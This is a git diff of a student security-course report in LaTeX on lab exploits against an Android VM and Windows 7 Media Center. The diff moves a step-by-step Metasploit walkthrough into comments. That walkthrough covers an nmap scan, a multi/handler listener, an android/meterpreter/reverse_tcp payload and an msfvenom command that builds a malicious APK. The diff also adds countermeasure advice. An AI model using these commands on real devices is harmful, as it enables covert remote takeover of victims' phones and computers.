-Firstly, we should see if the Android VM is listed on our current NAT Network. For this run the following command shown below:
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-]
-{Shell}
-nmap -sS
-\end{minted}
-\texttt{nmap} is a Security Scanner that allows us to scan networks with different options. The flags denoted by \texttt{-sS} are the most common and initiate a stealthier scan of the network.\cite{nmap}
+The following resources were cited during this process.\cite{nmap, hypr, sdo, os1, zain, comm}
 
-Thereafter 
-Open up the Metasploit console in Kali Linux by running the following command below:
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-msfconsole
-\end{minted}
-Thereafter run the following:
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-use exploit/multi/handler
-\end{minted}
-The Multi Handler command launches a stub that runs outside the Framework. This command launches a payload that is specific to our specification.\cite{os1}
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-search android/meterpreter
-\end{minted}
-Meterpreter is a tool that is part of the Metasploit Framework which allows you to take advantage of as well as find vulnerabilities in a system. This penetration testing tool can easily take hold of victim's resources as needed. Meterpreter utilises an in-memory injection which writes nothing to disk. This allows for the exploit to run without being detected by normal means. A new process is not created, rather it injects itself into a compromised process. For this reason also the forensic footprint left behind by the Meterpreter is limited.\cite{hypr, sdo}
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-set payload android/meterpreter/reverse_tcp
-\end{minted}
-When the host initiates a connection, that is called a \textit{forward connection}. However, when the opposite is done, a server initiates the connection to a host, then it is called a reverse connection.
-Firewalls work on the basic principle of blocking all incoming connection. So all incoming connections (reverse connections) are blocked by the firewall. However, if a host initiates a connection (forward connection) it is allowed and the return for the connection initiated by the host will be permitted.
-Reverse\_tcp is basically instead of the attacker initiating the connection which will obviously blocked by the firewall instead, the device initiates the connection to the attacker, which will be allowed by the firewall and the attacker then take control of the device and pass commands. It is a type of reverse shell.\cite{zain}
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-show options
-\end{minted}
-The above command shows the current options for the payload. These can then be changed as shown below.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-set LHOST <ip_address>
-\end{minted}
-The above command sets the IP address that will become a \textit{Listener}, in other words which IP address all the communication from the victim will be forwarded to.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-set LPORT <port_number>
-\end{minted}
-The above command changes the option of which port the \textit{Listener} should receive information. This is usually an open port that is not being used by any other process or service.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-exploit
-\end{minted}
-This aforementioned command begins the exploit and the \textit{Listener} will listen to any incoming responses from the victim. This is usually after the victim installs the malicious APK file and opens it. This is discussed further with the command listed below.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-]
-{Shell}
-msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/filename.apk
-\end{minted}
-A comprehensive list of commands for post-exploitation can be found in Metasploit's official documentation. These are shown below.\cite{comm}
-\inputminted[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-]{Text}{commands.txt}
+For further details have a look at our blog page for this exploit. It is located at the following link:\\
+\url{https://ITRI625.github.io/post1.html}
+% Firstly, we should see if the Android VM is listed on our current NAT Network. For this run the following command shown below:
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% ]
+% {Shell}
+% nmap -sS
+% \end{minted}
+% \texttt{nmap} is a Security Scanner that allows us to scan networks with different options. The flags denoted by \texttt{-sS} are the most common and initiate a stealthier scan of the network.\cite{nmap}
+
+% Thereafter 
+% Open up the Metasploit console in Kali Linux by running the following command below:
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% msfconsole
+% \end{minted}
+% Thereafter run the following:
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% use exploit/multi/handler
+% \end{minted}
+% The Multi Handler command launches a stub that runs outside the Framework. This command launches a payload that is specific to our specification.\cite{os1}
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% search android/meterpreter
+% \end{minted}
+% Meterpreter is a tool that is part of the Metasploit Framework which allows you to take advantage of as well as find vulnerabilities in a system. This penetration testing tool can easily take hold of victim's resources as needed. Meterpreter utilises an in-memory injection which writes nothing to disk. This allows for the exploit to run without being detected by normal means. A new process is not created, rather it injects itself into a compromised process. For this reason also the forensic footprint left behind by the Meterpreter is limited.\cite{hypr, sdo}
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% set payload android/meterpreter/reverse_tcp
+% \end{minted}
+% When the host initiates a connection, that is called a \textit{forward connection}. However, when the opposite is done, a server initiates the connection to a host, then it is called a reverse connection.
+% Firewalls work on the basic principle of blocking all incoming connection. So all incoming connections (reverse connections) are blocked by the firewall. However, if a host initiates a connection (forward connection) it is allowed and the return for the connection initiated by the host will be permitted.
+% Reverse\_tcp is basically instead of the attacker initiating the connection which will obviously blocked by the firewall instead, the device initiates the connection to the attacker, which will be allowed by the firewall and the attacker then take control of the device and pass commands. It is a type of reverse shell.\cite{zain}
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% show options
+% \end{minted}
+% The above command shows the current options for the payload. These can then be changed as shown below.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% set LHOST <ip_address>
+% \end{minted}
+% The above command sets the IP address that will become a \textit{Listener}, in other words which IP address all the communication from the victim will be forwarded to.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% set LPORT <port_number>
+% \end{minted}
+% The above command changes the option of which port the \textit{Listener} should receive information. This is usually an open port that is not being used by any other process or service.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% exploit
+% \end{minted}
+% This aforementioned command begins the exploit and the \textit{Listener} will listen to any incoming responses from the victim. This is usually after the victim installs the malicious APK file and opens it. This is discussed further with the command listed below.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% ]
+% {Shell}
+% msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/filename.apk
+% \end{minted}
+% A comprehensive list of commands for post-exploitation can be found in Metasploit's official documentation. These are shown below.\cite{comm}
+% \inputminted[
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% ]{Text}{commands.txt}
 
 \section{Countermeasures}
 \chapter{Scenario 2: Windows exploit}
 \section{Overview}
 The scenario is described as follows:
 \begin{displayquote}
-\textit{A person (that will be known as the victim in further discussions), opens a SMS received on their mobile device. This SMS has a malicious link embedded in it, or has a link that redirects to a malicious site. The link automatically downloads and runs an Android application package also known in other terms as an APK file. This APK file is what the Android Operating System uses to install applications. This malicious Application, once installed gives the Hacker (known as a perpetrator in an attack) full control over the device to outside parties, including the perpetrator. From here on out, the perpetrator has the victim in the palm of their hands, and can do what every they like to the device as well as carry out further attacks against the victim.}
+\textit{Windows 7 had all support for the operating system halted in January of 2020. Windows 7 was certainly a user favourite and the end of support saw quite a few users disgruntledly switch to either Windows 8 or 10 to continue to get security focused support and patches. At this point, the support for windows 7 has been defunct for almost 2 years and as such many new exploits have likely surfaced. Nonetheless, even before Windows 7 met its end-of-life there were still many exploits that could be performed on the system that were sequentially fixed in the new versions of Windows. One such vulnerability present in Windows 7 is that the default version of Windows Media Centre will execute any code saved as a ".mcl" file.}
 \end{displayquote}
 \section{Carrying out the exploit}
+For further details have a look at our blog page for this exploit. It is located at the following link:\\
+\url{https://ITRI625.github.io/post2.html}
 \section{Countermeasures}
+The most useful countermeasure to this, and typically, any security related vulnerability is user vigilance. A user should be aware of what files, services, websites, etc. should typically look like in their daily usage a computer system and, as such, should be able to identify when one of these, and in this case a file, looks suspicious and should be scanned via some program before using or opening it.
+Furthermore, it is also important since this exploit made use of a .mcl and .exe file that a user makes use of some form of antivirus or antimalware software and in this particular case, ones that are signature based. The reasoning for this is because the executable in this scenario is one that has been created and is typically used in a large scale. 
+It is also vital to understand the exploits you are vulnerable to. In the tutorial we demonstrated that the file could be run and Windows only alerts that it comes from an untrusted, meaning un-certified, source which nowadays is something that happens with most applications as the typically programmer does not have access to particular licencing on their applications. In this case, having a more rigorous firewall or settings for it may have restricted the reverse\_tcp from functioning.
+
+Apart from this, the main fix to this particular issue was to install a patch provided by Microsoft on their site, and as such having some sort of patch management system is also vital to users. This could be simply regularly checking each application download page for the newest version or patch. However, there are applications and programs that automate this process and keep all your programs up to date. It should also be noted that most programs tend to offer a "Check for updates" feature when installing the program and likely also in the settings after the fact. 
+
 \chapter{Closing remarks}
 \section{Reflection}
 Joshua Esterhuizen had the following to say:
 \begin{displayquote}
-Lorem ipsum
+Working on this project has taught me several different things both within and outside of computer security. The most notable to me personally would be the fact that GitHub allows each user to create and then host a single static website. This is what was used to host the blog section of this project but will also be used by me in a personal capacity for a personal website in future. Apart from this, seeing the sheer amount of exploits that Metasploit has available to use is a bit disconcerting as it covers a wide array of different machines, programs and means of execution and has definitely made me that much more critical of everything I do online. This project also allowed me the chance to learn how to use HTML and CSS when writing the blog, which also forced me to switch up my usual writing style for one that is more colloquial for the general public instead of assuming the people reading the writing are already knowledgeable on the topics.
 \end{displayquote}
 Affaan Muhammad had the following to say:
 \begin{displayquote}
